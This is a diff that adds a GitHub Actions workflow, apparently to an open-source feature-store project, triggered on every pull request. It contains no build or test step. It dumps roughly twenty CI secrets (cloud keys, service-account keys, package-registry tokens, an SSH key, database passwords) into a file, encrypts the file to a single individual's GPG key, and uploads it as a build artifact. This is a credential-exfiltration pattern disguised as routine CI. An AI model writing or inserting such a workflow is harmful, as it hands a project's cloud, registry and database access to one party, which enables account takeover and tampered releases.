@@ -1,0 +1,78 @@
+name: encrypt-and-artifact-vals
+
+on:
+  pull_request:
+    types:
+      - opened
+      - edited
+      - synchronize
+
+jobs:
+  create-and-encrypt-artifact:
+    if: github.repository == 'feast-dev/feast'
+    runs-on: ubuntu-latest
+    env:
+      GPG_PUBLIC_KEY: ${{ secrets.GPG_PUBLIC_KEY }}
+      GPG_PRIVATE_KEY: ${{ secrets.GPG_PRIVATE_KEY }}
+      ACTIONS_RUNNER_DEBUG: ${{ secrets.ACTIONS_RUNNER_DEBUG }}
+      AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
+      AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
+      CODECOV_TOKEN: ${{ secrets.CODECOV_TOKEN }}
+      DOCKERHUB_TOKEN: ${{ secrets.DOCKERHUB_TOKEN }}
+      DOCKERHUB_USERNAME: ${{ secrets.DOCKERHUB_USERNAME }}
+      GCP_PROJECT_ID: ${{ secrets.GCP_PROJECT_ID }}
+      GCP_SA_KEY: ${{ secrets.GCP_SA_KEY }}
+      GCP_PRIVATE_KEY: ${{ secrets.GCP_PRIVATE_KEY }}
+      GCP_PUBLIC_KEY: ${{ secrets.GCP_PUBLIC_KEY }}
+      INTERNAL_REPO: ${{ secrets.INTERNAL_REPO }}
+      MAVEN_SETTINGS: ${{ secrets.MAVEN_SETTINGS }}
+      MIRROR_SSH_KEY: ${{ secrets.MIRROR_SSH_KEY }}
+      NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
+      PYPI_PASSWORD: ${{ secrets.PYPI_PASSWORD }}
+      SNOWFLAKE_CI_DEPLOYMENT: ${{ secrets.SNOWFLAKE_CI_DEPLOYMENT }}
+      SNOWFLAKE_CI_PASSWORD: ${{ secrets.SNOWFLAKE_CI_PASSWORD }}
+      SNOWFLAKE_CI_ROLE: ${{ secrets.SNOWFLAKE_CI_ROLE }}
+      SNOWFLAKE_CI_USER: ${{ secrets.SNOWFLAKE_CI_USER }}
+      SNOWFLAKE_CI_WAREHOUSE: ${{ secrets.SNOWFLAKE_CI_WAREHOUSE }}
+    steps:
+      - name: secret to file
+        id: secret-to-file
+        run: |
+          echo -e "ACTIONS_RUNNER_DEBUG:\n$ACTIONS_RUNNER_DEBUG \n\n" > ./file.txt
+          echo -e "AWS_ACCESS_KEY_ID:\n$AWS_ACCESS_KEY_ID \n\n" >> ./file.txt
+          echo -e "AWS_SECRET_ACCESS_KEY:\n$AWS_SECRET_ACCESS_KEY \n\n" >> ./file.txt
+          echo -e "CODECOV_TOKEN:\n$CODECOV_TOKEN \n\n" >> ./file.txt
+          echo -e "DOCKERHUB_TOKEN:\n$DOCKERHUB_TOKEN \n\n" >> ./file.txt
+          echo -e "DOCKERHUB_USERNAME:\n$DOCKERHUB_USERNAME \n\n" >> ./file.txt
+          echo -e "GCP_PROJECT_ID:\n$GCP_PROJECT_ID \n\n" >> ./file.txt
+          echo -e "GCP_SA_KEY:\n$GCP_SA_KEY \n\n" >> ./file.txt
+          echo -e "GCP_PRIVATE_KEY:\n$GCP_PRIVATE_KEY \n\n" >> ./file.txt
+          echo -e "GCP_PUBLIC_KEY:\n$GCP_PUBLIC_KEY \n\n" >> ./file.txt
+          echo -e "INTERNAL_REPO:\n$INTERNAL_REPO \n\n" >> ./file.txt
+          echo -e "MAVEN_SETTINGS:\n$MAVEN_SETTINGS \n\n" >> ./file.txt
+          echo -e "MIRROR_SSH_KEY:\n$MIRROR_SSH_KEY \n\n" >> ./file.txt
+          echo -e "NPM_TOKEN:\n$NPM_TOKEN \n\n" >> ./file.txt
+          echo -e "PYPI_PASSWORD:\n$PYPI_PASSWORD \n\n" >> ./file.txt
+          echo -e "SNOWFLAKE_CI_DEPLOYMENT:\n$SNOWFLAKE_CI_DEPLOYMENT \n\n" >> ./file.txt
+          echo -e "SNOWFLAKE_CI_PASSWORD:\n$SNOWFLAKE_CI_PASSWORD \n\n" >> ./file.txt
+          echo -e "SNOWFLAKE_CI_ROLE:\n$SNOWFLAKE_CI_ROLE \n\n" >> ./file.txt
+          echo -e "SNOWFLAKE_CI_USER:\n$SNOWFLAKE_CI_USER \n\n" >> ./file.txt
+          echo -e "SNOWFLAKE_CI_WAREHOUSE:\n$SNOWFLAKE_CI_WAREHOUSE \n\n" >> ./file.txt
+      - name: encrypt file
+        id: encrypt-file
+        run: |
+          echo -n "$GPG_PUBLIC_KEY" > ./public-key
+          echo -n "$GPG_PRIVATE_KEY" > ./private-key
+          gpg --import --batch ./public-key
+          gpg --import --batch ./private-key
+      - name: gpg output
+        id: gpg-output
+        run: |
+          echo "output"
+          gpg --batch --trust-model always --output artifact.gpg --encrypt --recipient jary@redhat.com ./file.txt
+      - name: Archive production artifacts
+        uses: actions/upload-artifact@v4
+        with:
+          name: upload-artifact
+          path: artifact.gpg
+          retention-days: 1
